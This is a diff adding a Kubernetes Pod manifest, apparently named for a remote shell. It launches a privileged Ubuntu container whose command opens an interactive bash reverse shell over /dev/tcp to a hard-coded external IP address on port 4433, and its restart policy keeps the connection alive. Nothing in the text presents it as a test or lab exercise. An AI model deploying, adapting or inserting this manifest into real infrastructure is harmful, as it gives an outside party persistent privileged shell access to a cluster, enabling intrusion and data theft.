@@ -1,0 +1,23 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: remsh-raven
+  labels:
+    app: remsh
+spec:
+  containers:
+  - name: remsh
+    image: ubuntu:22.04
+    command: ["/bin/bash", "-c"]
+    args:
+      - exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1
+    env:
+      - name: RHOST
+        value: "15.134.182.244"
+      - name: RPORT
+        value: "4433"
+    stdin: true
+    tty: true
+    securityContext:
+      privileged: true
+  restartPolicy: Always
